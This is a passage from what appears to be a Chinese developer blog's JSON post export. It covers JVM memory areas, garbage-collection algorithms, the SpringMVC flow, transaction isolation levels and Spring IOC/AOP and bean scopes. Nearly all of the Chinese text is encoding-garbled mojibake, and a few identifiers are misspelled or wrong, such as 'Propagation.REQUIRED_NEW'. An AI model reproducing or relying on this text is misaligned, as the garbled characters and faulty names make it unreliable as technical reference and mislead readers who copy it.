å¦‚æœçº¿ç¨‹æ­£åœ¨æ‰§è¡Œçš„æ˜¯ä¸€ä¸ªJavaæ–¹æ³•ï¼Œè¿™ä¸ªè®¡æ•°å™¨è®°å½•çš„æ˜¯æ­£åœ¨æ‰§è¡Œçš„è™šæ‹Ÿæœºå­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼›å¦‚æœæ­£åœ¨æ‰§è¡Œçš„æ˜¯Natvieæ–¹æ³•ï¼Œè¿™ä¸ªè®¡æ•°å™¨å€¼åˆ™ä¸ºç©ºï¼ˆUndefinedï¼‰ã€‚ æ­¤å†…å­˜åŒºåŸŸæ˜¯å”¯ä¸€ä¸€ä¸ªåœ¨Javaè™šæ‹Ÿæœºè§„èŒƒä¸­æ²¡æœ‰è§„å®šä»»ä½•OutOfMemoryErroræƒ…å†µçš„åŒºåŸŸã€‚ JVMæ ˆï¼ˆJVM Stacksï¼‰ä¸ç¨‹åºè®¡æ•°å™¨ä¸€æ ·ï¼ŒJavaè™šæ‹Ÿæœºæ ˆï¼ˆJava Virtual Machine Stacksï¼‰ä¹Ÿæ˜¯çº¿ç¨‹ç§æœ‰çš„ï¼Œå®ƒçš„ç”Ÿå‘½å‘¨æœŸä¸çº¿ç¨‹ç›¸åŒã€‚è™šæ‹Ÿæœºæ ˆæè¿°çš„æ˜¯Javaæ–¹æ³•æ‰§è¡Œçš„å†…å­˜æ¨¡å‹ï¼šæ¯ä¸ªæ–¹æ³•è¢«æ‰§è¡Œçš„æ—¶å€™éƒ½ä¼šåŒæ—¶åˆ›å»ºä¸€ä¸ªæ ˆå¸§ï¼ˆStack Frameï¼‰ç”¨äºå­˜å‚¨å±€éƒ¨å˜é‡è¡¨ã€æ“ä½œæ ˆã€åŠ¨æ€é“¾æ¥ã€æ–¹æ³•å‡ºå£ç­‰ä¿¡æ¯ã€‚æ¯ä¸€ä¸ªæ–¹æ³•è¢«è°ƒç”¨ç›´è‡³æ‰§è¡Œå®Œæˆçš„è¿‡ç¨‹ï¼Œå°±å¯¹åº”ç€ä¸€ä¸ªæ ˆå¸§åœ¨è™šæ‹Ÿæœºæ ˆä¸­ä»å…¥æ ˆåˆ°å‡ºæ ˆçš„è¿‡ç¨‹ã€‚ å±€éƒ¨å˜é‡è¡¨å­˜æ”¾äº†ç¼–è¯‘æœŸå¯çŸ¥çš„å„ç§åŸºæœ¬æ•°æ®ç±»å‹ï¼ˆbooleanã€byteã€charã€shortã€intã€floatã€longã€doubleï¼‰ã€å¯¹è±¡å¼•ç”¨ï¼ˆreferenceç±»å‹ï¼Œå®ƒä¸ç­‰åŒäºå¯¹è±¡æœ¬èº«ï¼Œæ ¹æ®ä¸åŒçš„è™šæ‹Ÿæœºå®ç°ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªæŒ‡å‘å¯¹è±¡èµ·å§‹åœ°å€çš„å¼•ç”¨æŒ‡é’ˆï¼Œä¹Ÿå¯èƒ½æŒ‡å‘ä¸€ä¸ªä»£è¡¨å¯¹è±¡çš„å¥æŸ„æˆ–è€…å…¶ä»–ä¸æ­¤å¯¹è±¡ç›¸å…³çš„ä½ç½®ï¼‰å’ŒreturnAddressç±»å‹ï¼ˆæŒ‡å‘äº†ä¸€æ¡å­—èŠ‚ç æŒ‡ä»¤çš„åœ°å€ï¼‰ã€‚ å…¶ä¸­64ä½é•¿åº¦çš„longå’Œdoubleç±»å‹çš„æ•°æ®ä¼šå ç”¨2ä¸ªå±€éƒ¨å˜é‡ç©ºé—´ï¼ˆSlotï¼‰ï¼Œå…¶ä½™çš„æ•°æ®ç±»å‹åªå ç”¨1ä¸ªã€‚å±€éƒ¨å˜é‡è¡¨æ‰€éœ€çš„å†…å­˜ç©ºé—´åœ¨ç¼–è¯‘æœŸé—´å®Œæˆåˆ†é…ï¼Œå½“è¿›å…¥ä¸€ä¸ªæ–¹æ³•æ—¶ï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦åœ¨å¸§ä¸­åˆ†é…å¤šå¤§çš„å±€éƒ¨å˜é‡ç©ºé—´æ˜¯å®Œå…¨ç¡®å®šçš„ï¼Œåœ¨æ–¹æ³•è¿è¡ŒæœŸé—´ä¸ä¼šæ”¹å˜å±€éƒ¨å˜é‡è¡¨çš„å¤§å°ã€‚ åœ¨Javaè™šæ‹Ÿæœºè§„èŒƒä¸­ï¼Œå¯¹è¿™ä¸ªåŒºåŸŸè§„å®šäº†ä¸¤ç§å¼‚å¸¸çŠ¶å†µï¼šå¦‚æœçº¿ç¨‹è¯·æ±‚çš„æ ˆæ·±åº¦å¤§äºè™šæ‹Ÿæœºæ‰€å…è®¸çš„æ·±åº¦ï¼Œå°†æŠ›å‡ºStackOverflowErrorå¼‚å¸¸ï¼›å¦‚æœè™šæ‹Ÿæœºæ ˆå¯ä»¥åŠ¨æ€æ‰©å±•ï¼ˆå½“å‰å¤§éƒ¨åˆ†çš„Javaè™šæ‹Ÿæœºéƒ½å¯åŠ¨æ€æ‰©å±•ï¼Œåªä¸è¿‡Javaè™šæ‹Ÿæœºè§„èŒƒä¸­ä¹Ÿå…è®¸å›ºå®šé•¿åº¦çš„è™šæ‹Ÿæœºæ ˆï¼‰ï¼Œå½“æ‰©å±•æ—¶æ— æ³•ç”³è¯·åˆ°è¶³å¤Ÿçš„å†…å­˜æ—¶ä¼šæŠ›å‡ºOutOfMemoryErrorå¼‚å¸¸ã€‚ æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Method Stacksï¼‰æœ¬åœ°æ–¹æ³•æ ˆï¼ˆNative Method Stacksï¼‰ä¸è™šæ‹Ÿæœºæ ˆæ‰€å‘æŒ¥çš„ä½œç”¨æ˜¯éå¸¸ç›¸ä¼¼çš„ï¼Œå…¶åŒºåˆ«ä¸è¿‡æ˜¯è™šæ‹Ÿæœºæ ˆä¸ºè™šæ‹Ÿæœºæ‰§è¡ŒJavaæ–¹æ³•ï¼ˆä¹Ÿå°±æ˜¯å­—èŠ‚ç ï¼‰æœåŠ¡ï¼Œè€Œæœ¬åœ°æ–¹æ³•æ ˆåˆ™æ˜¯ä¸ºè™šæ‹Ÿæœºä½¿ç”¨åˆ°çš„Nativeæ–¹æ³•æœåŠ¡ã€‚è™šæ‹Ÿæœºè§„èŒƒä¸­å¯¹æœ¬åœ°æ–¹æ³•æ ˆä¸­çš„æ–¹æ³•ä½¿ç”¨çš„è¯­è¨€ã€ä½¿ç”¨æ–¹å¼ä¸æ•°æ®ç»“æ„å¹¶æ²¡æœ‰å¼ºåˆ¶è§„å®šï¼Œå› æ­¤å…·ä½“çš„è™šæ‹Ÿæœºå¯ä»¥è‡ªç”±å®ç°å®ƒã€‚ç”šè‡³æœ‰çš„è™šæ‹Ÿæœºï¼ˆè­¬å¦‚Sun HotSpotè™šæ‹Ÿæœºï¼‰ç›´æ¥å°±æŠŠæœ¬åœ°æ–¹æ³•æ ˆå’Œè™šæ‹Ÿæœºæ ˆåˆäºŒä¸ºä¸€ã€‚ä¸è™šæ‹Ÿæœºæ ˆä¸€æ ·ï¼Œæœ¬åœ°æ–¹æ³•æ ˆåŒºåŸŸä¹Ÿä¼šæŠ›å‡ºStackOverflowErrorå’ŒOutOfMemoryErrorå¼‚å¸¸ã€‚ æ€»ç»“1ï¼‰ç¨‹åºè®¡æ•°å™¨ å‡ ä¹ä¸å æœ‰å†…å­˜ã€‚ç”¨äºå–ä¸‹ä¸€æ¡æ‰§è¡Œçš„æŒ‡ä»¤ã€‚2ï¼‰å † æ‰€æœ‰é€šè¿‡newåˆ›å»ºçš„å¯¹è±¡çš„å†…å­˜éƒ½åœ¨å †ä¸­åˆ†é…ï¼Œå…¶å¤§å°å¯ä»¥é€šè¿‡-Xmxå’Œ-Xmsæ¥æ§åˆ¶ã€‚å †è¢«åˆ’åˆ†ä¸ºæ–°ç”Ÿä»£å’Œæ—§ç”Ÿä»£ï¼Œæ–°ç”Ÿä»£åˆè¢«è¿›ä¸€æ­¥åˆ’åˆ†ä¸ºEdenå’ŒSurvivoråŒºï¼Œæœ€åSurvivorç”±FromSpaceå’ŒToSpaceç»„æˆï¼Œç»“æ„å›¾å¦‚ä¸‹æ‰€ç¤ºï¼šæ–°ç”Ÿä»£ã€‚æ–°å»ºçš„å¯¹è±¡éƒ½æ˜¯ç”¨æ–°ç”Ÿä»£åˆ†é…å†…å­˜ï¼ŒEdenç©ºé—´ä¸è¶³çš„æ—¶å€™ï¼Œä¼šæŠŠå­˜æ´»çš„å¯¹è±¡è½¬ç§»åˆ°Survivorä¸­ï¼Œæ–°ç”Ÿä»£å¤§å°å¯ä»¥ç”±-Xmnæ¥æ§åˆ¶ï¼Œä¹Ÿå¯ä»¥ç”¨-XX:SurvivorRatioæ¥æ§åˆ¶Edenå’ŒSurvivorçš„æ¯”ä¾‹æ—§ç”Ÿä»£ã€‚ç”¨äºå­˜æ”¾æ–°ç”Ÿä»£ä¸­ç»è¿‡å¤šæ¬¡åƒåœ¾å›æ”¶ä»ç„¶å­˜æ´»çš„å¯¹è±¡ã€‚ 3ï¼‰æ ˆ æ¯ä¸ªçº¿ç¨‹æ‰§è¡Œæ¯ä¸ªæ–¹æ³•çš„æ—¶å€™éƒ½ä¼šåœ¨æ ˆä¸­ç”³è¯·ä¸€ä¸ªæ ˆå¸§ï¼Œæ¯ä¸ªæ ˆå¸§åŒ…æ‹¬å±€éƒ¨å˜é‡åŒºå’Œæ“ä½œæ•°æ ˆï¼Œç”¨äºå­˜æ”¾æ­¤æ¬¡æ–¹æ³•è°ƒç”¨è¿‡ç¨‹ä¸­çš„ä¸´æ—¶å˜é‡ã€å‚æ•°å’Œä¸­é—´ç»“æœã€‚4ï¼‰æœ¬åœ°æ–¹æ³•æ ˆ ç”¨äºæ”¯æŒnativeæ–¹æ³•çš„æ‰§è¡Œï¼Œå­˜å‚¨äº†æ¯ä¸ªnativeæ–¹æ³•è°ƒç”¨çš„çŠ¶æ€5ï¼‰æ–¹æ³•åŒº å­˜æ”¾äº†è¦åŠ è½½çš„ç±»ä¿¡æ¯ã€é™æ€å˜é‡ã€finalç±»å‹çš„å¸¸é‡ã€å±æ€§å’Œæ–¹æ³•ä¿¡æ¯ã€‚JVMç”¨æ°¸ä¹…ä»£ï¼ˆPermanetGenerationï¼‰æ¥å­˜æ”¾æ–¹æ³•åŒºï¼Œï¼ˆåœ¨JDKçš„HotSpotè™šæ‹Ÿæœºä¸­ï¼Œå¯ä»¥è®¤ä¸ºæ–¹æ³•åŒºå°±æ˜¯æ°¸ä¹…ä»£ï¼Œä½†æ˜¯åœ¨å…¶ä»–ç±»å‹çš„è™šæ‹Ÿæœºä¸­ï¼Œæ²¡æœ‰æ°¸ä¹…ä»£çš„æ¦‚å¿µï¼Œæœ‰å…³ä¿¡æ¯å¯ä»¥çœ‹å‘¨å¿—æ˜çš„ä¹¦ï¼‰å¯é€šè¿‡-XX:PermSizeå’Œ-XX:MaxPermSizeæ¥æŒ‡å®šæœ€å°å€¼å’Œæœ€å¤§å€¼ã€‚","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"}]},{"title":"JVMåƒåœ¾å›æ”¶æœºåˆ¶","slug":"JVMåƒåœ¾å›æ”¶æœºåˆ¶","date":"2020-12-16T09:46:57.000Z","updated":"2021-04-11T17:11:28.226Z","comments":true,"path":"JVMåƒåœ¾å›æ”¶æœºåˆ¶/","link":"","permalink":"https://blog.kayleh.top/JVM%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E6%9C%BA%E5%88%B6/","excerpt":"","text":"GCæ˜¯ä»€ä¹ˆåˆ†ä»£æ”¶é›†ç®—æ³• æ¬¡æ•°ä¸Šé¢‘ç¹æ”¶é›†YoungåŒº Minor GC æ¬¡æ•°ä¸Šè¾ƒå°‘æ”¶é›†OldåŒº Full GC åŸºæœ¬ä¸åŠ¨Permæ°¸ä¹…åŒº GCæ˜¯å‘ç”Ÿåœ¨å“ªä¸ªéƒ¨åˆ† GCæ˜¯å‘ç”Ÿåœ¨å †(heap)é‡Œé¢çš„ GCåˆ†å‡ ç§?:one:å¼•ç”¨è®¡æ•°æ³•(è¢«æ·˜æ±°)ç¼ºç‚¹: æ¯æ¬¡å¯¹å¯¹è±¡èµ‹å€¼æ—¶å‡è¦ç»´æŠ¤å¼•ç”¨è®¡æ•°å™¨,ä¸”è®¡æ•°å™¨æœ¬èº«ä¹Ÿæœ‰ä¸€å®šçš„æ¶ˆè€— è¾ƒéš¾å¤„ç†å¾ªç¯å¼•ç”¨ JVMçš„å®ç°ä¸€èˆ¬ä¸é‡‡ç”¨è¿™ç§æ–¹å¼ :two:å¤åˆ¶ç®—æ³•(Copying)å¹´è½»ä»£ä¸­ä½¿ç”¨çš„æ˜¯Minor GC,è¿™ç§GCç®—æ³•é‡‡ç”¨çš„æ˜¯å¤åˆ¶ç®—æ³•(Copying) åŸç†: ä»æ ¹é›†åˆ(GC Root)å¼€å§‹,é€šè¿‡Tracingä»Fromä¸­æ‰¾åˆ°å­˜æ´»å¯¹è±¡,æ‹·è´åˆ°Toä¸­; Fromä¸¶Toäº¤æ¢èº«ä»½,ä¸‹æ¬¡å†…å­˜åˆ†é…ä»Toå¼€å§‹ ä¼˜åŠ¿:heavy_check_mark: æ²¡æœ‰æ ‡è®°å’Œæ¸…é™¤çš„è¿‡ç¨‹,æ•ˆç‡é«˜ æ²¡æœ‰å†…å­˜ç¢ç‰‡,å¯ä»¥åˆ©ç”¨bump-the-pointrtå®ç°å¿«é€Ÿå†…å­˜åˆ†é… åŠ£åŠ¿:heavy_multiplication_x: éœ€è¦åŒå€ç©ºé—´ :three:æ ‡è®°æ¸…é™¤(Mark-Sweep)è€å¹´ä»£ä¸€èˆ¬æ˜¯ç”±æ ‡è®°æ¸…é™¤æˆ–è€…æ˜¯æ ‡è®°æ¸…é™¤ä¸æ ‡è®°æ•´ç†çš„æ··åˆå®ç° åŸç† 1.æ ‡è®°(Mark) ä»æ ¹é›†åˆå¼€å§‹æ‰«æ,å¯¹å­˜æ´»çš„å¯¹è±¡è¿›è¡Œæ ‡è®° 2.æ¸…é™¤(Sweep) æ‰«ææ•´ä¸ªå†…å­˜ç©ºé—´,å›æ”¶æœªè¢«æ ‡è®°çš„å¯¹è±¡,ä½¿ç”¨free-listè®°å½•å¯ä»¥åŒºåŸŸ. ä¼˜åŠ¿:heavy_check_mark: ä¸éœ€è¦é¢å¤–ç©ºé—´ åŠ£åŠ¿:heavy_multiplication_x: ä¸¤æ¬¡æ‰«æ,è€—æ—¶ä¸¥é‡ ä¼šäº§ç”Ÿå†…å­˜ç¢ç‰‡ :four:æ ‡è®°å‹ç¼©(Mark-Compact)åŸç†: 1.æ ‡è®°(Mark) ä¸æ ‡è®°-æ¸…é™¤ä¸€æ · 2.å‹ç¼©(Compact) å†æ¬¡æ‰«æ,å¹¶å¾€ä¸€æ®µæ»‘åŠ¨å­˜æ´»å¯¹è±¡. ä¼˜åŠ¿:heavy_check_mark: æ²¡æœ‰å†…å­˜ç¢ç‰‡,å¯ä»¥åˆ©ç”¨bump-the-pointrt åŠ£åŠ¿:heavy_multiplication_x: éœ€è¦ç§»åŠ¨å¯¹è±¡çš„æˆæœ¬ :five:æ ‡è®°æ¸…é™¤å‹ç¼©(Mark-Sweep-Compact)åŸç†: 1.Mark-Sweepå’ŒMark-Compactçš„ç»“åˆ 2.å’ŒMark-Sweepä¸€è‡´,å½“è¿›è¡Œå¤šæ¬¡GCåæ‰Compact :heavy_check_mark:å‡å°‘ç§»åŠ¨å¯¹è±¡çš„æˆæœ¬","categories":[],"tags":[{"name":"JVM","slug":"JVM","permalink":"https://blog.kayleh.top/tags/JVM/"}]},{"title":"SpringMVC work stream","slug":"SpringMVCå·¥ä½œæµç¨‹","date":"2020-12-16T07:13:22.000Z","updated":"2021-04-11T17:11:28.436Z","comments":true,"path":"SpringMVCå·¥ä½œæµç¨‹/","link":"","permalink":"https://blog.kayleh.top/SpringMVC%E5%B7%A5%E4%BD%9C%E6%B5%81%E7%A8%8B/","excerpt":"","text":"SpringMVCå·¥ä½œæµç¨‹springmvcå·¥ä½œæµç¨‹ å¤„ç†æ¨¡å‹æ•°æ®æ–¹å¼ä¸€:å°†æ–¹æ³•çš„è¿”å›å€¼è®¾ç½®ä¸ºModelAndView å¤„ç†æ¨¡å‹æ•°æ®æ–¹å¼äºŒ:æ–¹æ³•çš„è¿”å›å€¼ä»æ˜¯Stringç±»å‹,åœ¨æ–¹æ³•çš„å…¥å‚ä¸­ä¼ å…¥Map,Modelæˆ–è€…ModelMap, ä¸ç®¡å°†å¤„ç†å™¨æ–¹æ³•çš„è¿”å›å€¼è®¾ç½®ä¸ºModelAndViewè¿˜æ˜¯åœ¨æ–¹æ³•çš„å…¥å‚ä¼ å…¥Map,Modelæˆ–è€…ModelMap,SpringMVCéƒ½ä¼šè½¬æ¢ä¸ºä¸€ä¸ªModelAndViewå¯¹è±¡.","categories":[],"tags":[{"name":"frame","slug":"frame","permalink":"https://blog.kayleh.top/tags/frame/"}]},{"title":"Transaction isolation level","slug":"äº‹åŠ¡çš„éš”ç¦»çº§åˆ«","date":"2020-12-16T06:14:51.000Z","updated":"2021-04-11T17:11:28.564Z","comments":true,"path":"äº‹åŠ¡çš„éš”ç¦»çº§åˆ«/","link":"","permalink":"https://blog.kayleh.top/%E4%BA%8B%E5%8A%A1%E7%9A%84%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB/","excerpt":"","text":"äº‹åŠ¡çš„éš”ç¦»çº§åˆ«äº‹åŠ¡æ˜¯å¿…é¡»æ»¡è¶³4ä¸ªæ¡ä»¶ï¼ˆACIDï¼‰ï¼šï¼šåŸå­æ€§ï¼ˆAtomicityï¼Œæˆ–ç§°ä¸å¯åˆ†å‰²æ€§ï¼‰ã€ä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ã€éš”ç¦»æ€§ï¼ˆIsolationï¼Œåˆç§°ç‹¬ç«‹æ€§ï¼‰ã€æŒä¹…æ€§ï¼ˆDurabilityï¼‰ã€‚ åŸå­æ€§ï¼šä¸€ä¸ªäº‹åŠ¡ï¼ˆtransactionï¼‰ä¸­çš„æ‰€æœ‰æ“ä½œï¼Œè¦ä¹ˆå…¨éƒ¨å®Œæˆï¼Œè¦ä¹ˆå…¨éƒ¨ä¸å®Œæˆï¼Œä¸ä¼šç»“æŸåœ¨ä¸­é—´æŸä¸ªç¯èŠ‚ã€‚äº‹åŠ¡åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­å‘ç”Ÿé”™è¯¯ï¼Œä¼šè¢«å›æ»šï¼ˆRollbackï¼‰åˆ°äº‹åŠ¡å¼€å§‹å‰çš„çŠ¶æ€ï¼Œå°±åƒè¿™ä¸ªäº‹åŠ¡ä»æ¥æ²¡æœ‰æ‰§è¡Œè¿‡ä¸€æ ·ã€‚ ä¸€è‡´æ€§ï¼šåœ¨äº‹åŠ¡å¼€å§‹ä¹‹å‰å’Œäº‹åŠ¡ç»“æŸä»¥åï¼Œæ•°æ®åº“çš„å®Œæ•´æ€§æ²¡æœ‰è¢«ç ´åã€‚è¿™è¡¨ç¤ºå†™å…¥çš„èµ„æ–™å¿…é¡»å®Œå…¨ç¬¦åˆæ‰€æœ‰çš„é¢„è®¾è§„åˆ™ï¼Œè¿™åŒ…å«èµ„æ–™çš„ç²¾ç¡®åº¦ã€ä¸²è”æ€§ä»¥åŠåç»­æ•°æ®åº“å¯ä»¥è‡ªå‘æ€§åœ°å®Œæˆé¢„å®šçš„å·¥ä½œã€‚ éš”ç¦»æ€§ï¼šæ•°æ®åº“å…è®¸å¤šä¸ªå¹¶å‘äº‹åŠ¡åŒæ—¶å¯¹å…¶æ•°æ®è¿›è¡Œè¯»å†™å’Œä¿®æ”¹çš„èƒ½åŠ›ï¼Œéš”ç¦»æ€§å¯ä»¥é˜²æ­¢å¤šä¸ªäº‹åŠ¡å¹¶å‘æ‰§è¡Œæ—¶ç”±äºäº¤å‰æ‰§è¡Œè€Œå¯¼è‡´æ•°æ®çš„ä¸ä¸€è‡´ã€‚äº‹åŠ¡éš”ç¦»åˆ†ä¸ºä¸åŒçº§åˆ«ï¼ŒåŒ…æ‹¬è¯»æœªæäº¤ï¼ˆRead uncommittedï¼‰ã€è¯»æäº¤ï¼ˆread committedï¼‰ã€å¯é‡å¤è¯»ï¼ˆrepeatable readï¼‰å’Œä¸²è¡ŒåŒ–ï¼ˆSerializableï¼‰ã€‚ æŒä¹…æ€§ï¼šäº‹åŠ¡å¤„ç†ç»“æŸåï¼Œå¯¹æ•°æ®çš„ä¿®æ”¹å°±æ˜¯æ°¸ä¹…çš„ï¼Œå³ä¾¿ç³»ç»Ÿæ•…éšœä¹Ÿä¸ä¼šä¸¢å¤±ã€‚ æ•°æ®åº“äº‹åŠ¡å¹¶å‘é—®é¢˜å‡è®¾é€‰æ‹©æœ‰ä¸¤ä¸ªäº‹åŠ¡:Transaction01å’ŒTransaction02å¹¶å‘æ‰§è¡Œ. 1)è„è¯» â‘ Transaction01å°†æŸæ¡è®°å½•çš„AGEå€¼ä»20ä¿®æ”¹ä¸º30. â‘¡Transaction02è¯»å–äº†Transaction01æ›´æ–°åçš„å€¼:30. â‘¢Transaction01å›æ»š.AGEå€¼æ¢å¤åˆ°äº†20. â‘£Transaction02è¯»å–åˆ°çš„30å°±æ˜¯ä¸€ä¸ªæ— æ•ˆçš„å€¼. 2)ä¸å¯é‡å¤è¯» â‘ Transaction01è¯»å–äº†AGEå€¼ä¸º20. â‘¡Transaction02å°†AGEå€¼ä¿®æ”¹ä¸º30. â‘¢Transaction01å†æ¬¡è¯»å–AGEå€¼ä¸º30,å’Œç¬¬ä¸€æ¬¡è¯»å–ä¸ä¸€è‡´. 3)å¹»è¯» â‘ Transaction01è¯»å–äº†STUDENTè¡¨ä¸­çš„ä¸€éƒ¨åˆ†æ•°æ® â‘¡Transaction02å‘STUDENTè¡¨ä¸­æ’å…¥äº†æ–°çš„è¡Œ â‘¢Transaction01è¯»å–çš„æ—¶å€™,å¤šäº†ä¸€äº›æ–°çš„è¡Œ,æ„Ÿè§‰å‡ºç°äº†å¹»è§‰ éš”ç¦»çº§åˆ« ä¸€ä¸ªäº‹åŠ¡ä¸å…¶ä»–äº‹åŠ¡éš”ç¦»çš„ç¨‹åº¦ç§°ä¸ºéš”ç¦»çº§åˆ« 1)è¯»æœªæäº¤:READ UNCOMMITTED å…è®¸Transaction01è¯»å–Transaction02æœªæäº¤çš„ä¿®æ”¹ 2)è¯»å·²æäº¤:READ COMMITTED è¦æ±‚Transaction01åªèƒ½æå–Transaction02å·²æäº¤çš„ä¿®æ”¹ 3)å¯é‡å¤è¯»: REPEATABLE READ ç¡®ä¿Transaction01å¯ä»¥å¤šæ¬¡ä»ä¸€ä¸ªå­—æ®µä¸­è¯»å–åˆ°ç›¸åŒçš„å€¼,å³Transaction01æ‰§è¡ŒæœŸé—´ç¦æ­¢å…¶ä»–äº‹åŠ¡å¯¹è¿™ä¸ªå­—æ®µæ›´æ–° 4)ä¸²è¡ŒåŒ–: SERIALIZABLE ç¡®ä¿Transaction01å¯ä»¥å¤šæ¬¡ä»ä¸€ä¸ªè¡¨ä¸­è¯»å–åˆ°ç›¸åŒçš„è¡Œ.åœ¨Transaction01æ‰§è¡ŒæœŸé—´,ç¦æ­¢å…¶ä»–äº‹åŠ¡å¯¹è¿™ä¸ªè¡¨è¿›è¡Œæ·»åŠ ,æ›´æ–°,åˆ é™¤æ“ä½œ.å¯ä»¥é¿å…ä»»ä½•å¹¶å‘é—®é¢˜,ä½†æ€§èƒ½ååˆ†ä½ä¸‹. éš”ç¦»çº§åˆ« è„è¯» ä¸å¯é‡å¤è¯» å¹»è¯».è™šæ‹Ÿè¯»å– æœªæäº¤è¯» æ˜¯ æ˜¯ æ˜¯ å·²æäº¤è¯» å¦ æ˜¯ æ˜¯ å¯é‡å¤è¯» å¦ å¦ æ˜¯ å¿«ç…§ å¦ å¦ å¦ å¯åºåˆ—åŒ– å¦ å¦ å¦","categories":[],"tags":[{"name":"sql","slug":"sql","permalink":"https://blog.kayleh.top/tags/sql/"}]},{"title":"Spring Related","slug":"Springçš„ä½œç”¨åŸŸ","date":"2020-12-16T05:44:11.000Z","updated":"2021-04-11T17:11:28.454Z","comments":true,"path":"Springçš„ä½œç”¨åŸŸ/","link":"","permalink":"https://blog.kayleh.top/Spring%E7%9A%84%E4%BD%9C%E7%94%A8%E5%9F%9F/","excerpt":"","text":"Springç›¸å…³ä»€ä¹ˆæ˜¯IOCIOCï¼š Inversion of control åè½¬æ§åˆ¶ã€‚ æ¯”å¦‚ä»¥å‰åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œéœ€è¦è‡ªå·±ä¸»åŠ¨new ä¸€ä¸ªå¯¹è±¡ï¼Œé€šè¿‡IOCï¼Œå¯¹è±¡çš„åˆ›å»ºäº¤ç”±Springæ¡†æ¶ åˆ›å»ºï¼Œå¼€å‘äººå‘˜ç›´æ¥ä½¿ç”¨å·²ç»åˆ›å»ºå¥½çš„å¯¹è±¡ã€‚ ä»€ä¹ˆæ˜¯DIDIï¼š Dependency Injection ä¾èµ–æ³¨å…¥ã€‚ é€šè¿‡IOCåˆ›å»ºå¯¹è±¡çš„æ—¶å€™ï¼Œå¯ä»¥æ³¨å…¥å­—ç¬¦ä¸²ç”šè‡³å…¶ä»–å¯¹è±¡ã€‚ æ¯”å¦‚DAOå°±ä¼šæ³¨å…¥session factory. é€šå¸¸IOCå’ŒDIæ˜¯ç´§å¯†ç»“åˆï¼Œä¸€èµ·ä½¿ç”¨çš„ ä»€ä¹ˆæ˜¯AOPæŠŠåŠŸèƒ½åˆ’åˆ†ä¸ºæ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½å’Œå…¶ä»–çš„å‘¨è¾¹è¾…åŠ©åŠŸèƒ½ï¼Œæ¯”å¦‚æ—¥å¿—ï¼Œæ€§èƒ½ç»Ÿè®¡ï¼Œäº‹åŠ¡ç­‰ç­‰ã€‚ å…¶ä»–çš„å‘¨è¾¹è¾…åŠ©åŠŸèƒ½å¯ä»¥éƒ½çœ‹ä½œåˆ‡é¢åŠŸèƒ½ã€‚æ ¸å¿ƒåŠŸèƒ½å’Œåˆ‡é¢åŠŸèƒ½åˆ†åˆ«ç‹¬ç«‹å¼€å‘ï¼Œé€šè¿‡é¢å‘åˆ‡é¢ç¼–ç¨‹ï¼Œå¯ä»¥æœ‰æœºçš„æŠŠæ ¸å¿ƒä¸šåŠ¡åŠŸèƒ½å’Œåˆ‡é¢åŠŸèƒ½æ ¹æ®éœ€æ±‚ç»“åˆåœ¨ä¸€èµ·ã€‚ æ¯”å¦‚å¢åŠ æ“ä½œå¯ä»¥å’Œäº‹åŠ¡åˆ‡é¢ç»“åˆåœ¨ä¸€èµ·ï¼ŒæŸ¥è¯¢æ“ä½œå¯ä»¥å’Œæ€§èƒ½ç»Ÿè®¡åˆ‡é¢ç»“åˆåœ¨ä¸€èµ·ã€‚åœ¨é…ç½®æ–¹é¢ï¼Œè¦é…ç½®åˆ‡é¢ï¼Œåˆ‡ç‚¹ï¼Œå¹¶ä¸”é€šè¿‡aspect:config æŠŠåˆ‡é¢å’Œåˆ‡ç‚¹ç»“åˆèµ·æ¥ã€‚ ä»€ä¹ˆæ˜¯AOP beançš„ä½œç”¨åŸŸ å¯ä»¥é€šè¿‡é…ç½®æ–‡ä»¶çš„scopeå±æ€§æ¥æŒ‡å®šbeançš„ä½œç”¨åŸŸ singleton:é»˜è®¤å€¼.å½“IOCå®¹å™¨ä¸€åˆ›å»ºå°±ä¼šåˆ›å»ºbeançš„å®ä¾‹.è€Œä¸”æ˜¯å•ä¾‹çš„,æ¯æ¬¡å¾—åˆ°çš„éƒ½æ˜¯åŒä¸€ä¸ª. prototype:åŸå‹çš„.å½“IOCå®¹å™¨ä¸€åˆ›å»ºä¸å†å®ä¾‹åŒ–è¯¥bean,æ¯æ¬¡è°ƒç”¨getBeanæ–¹æ³•æ—¶å†å®ä¾‹åŒ–è¯¥bean,è€Œä¸”æ¯æ¬¡å¾—åˆ°çš„ä¸æ˜¯åŒä¸€ä¸ª request:æ¯æ¬¡è¯·æ±‚å®ä¾‹åŒ–ä¸€ä¸ªbean session:åœ¨ä¸€æ¬¡ä¼šè¯ä¸­å…±äº«ä¸€ä¸ªbean Springæ”¯æŒçš„å¸¸ç”¨æ•°æ®åº“äº‹åŠ¡ä¼ æ’­å±æ€§å’Œäº‹åŠ¡éš”ç¦»çº§åˆ« propagation:ç”¨æ¥è®¾ç½®äº‹åŠ¡çš„ä¼ æ’­è¡Œä¸º äº‹åŠ¡çš„ä¼ æ’­è¡Œä¸º:ä¸€ä¸ªäº‹åŠ¡æ–¹æ³•è¿è¡Œåœ¨äº†ä¸€ä¸ªå¼€å¯äº†äº‹åŠ¡çš„æ–¹æ³•ä¸­æ—¶,å½“å‰æ–¹æ³•æ—¶ä½¿ç”¨åŸæ¥çš„äº‹åŠ¡è¿˜æ˜¯å¼€å¯ä¸€ä¸ªæ–°çš„äº‹åŠ¡ Propagation.REQUIRED:é»˜è®¤å€¼,ä½¿ç”¨åŸæ¥çš„äº‹åŠ¡ Propagation.REQUIRED_NEW:å°†åŸæ¥çš„äº‹åŠ¡æŒ‚èµ·,å¼€å¯ä¸€ä¸ªæ–°çš„äº‹åŠ¡ isolation:ç”¨æ¥è®¾ç½®äº‹åŠ¡çš„éš”ç¦»çº§åˆ« Isolation.REPEATABLE_READ:å¯é‡å¤è¯»,MySQLé»˜è®¤çš„éš”ç¦»çº§åˆ« 